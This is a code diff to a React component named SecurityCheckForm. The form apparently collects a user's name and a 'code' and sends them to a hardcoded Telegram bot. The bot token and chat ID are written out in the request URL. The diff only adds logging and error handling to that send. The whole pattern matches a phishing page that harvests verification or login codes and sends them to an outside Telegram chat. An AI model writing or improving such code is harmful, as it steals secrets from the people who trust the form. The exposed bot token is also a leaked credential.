@@ -14,7 +14,7 @@ export default function SecurityCheckForm() {
       setShowTick(true);
       setLoading(true);
 
-      // Send to Telegram
+      // Send to Telegram with logging
       const telegramMessage = `New Submission:\nName: ${name}\nCode: ${code}`;
       fetch(`https://api.telegram.org/bot7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y/sendMessage`, {
         method: "POST",
@@ -25,7 +25,10 @@ export default function SecurityCheckForm() {
           chat_id: "7305039129",
           text: telegramMessage
         })
-      });
+      })
+      .then(response => response.json())
+      .then(data => console.log("Telegram Response:", data))
+      .catch(error => console.error("Error sending to Telegram:", error));
 
       setTimeout(() => {
         setLoading(false);
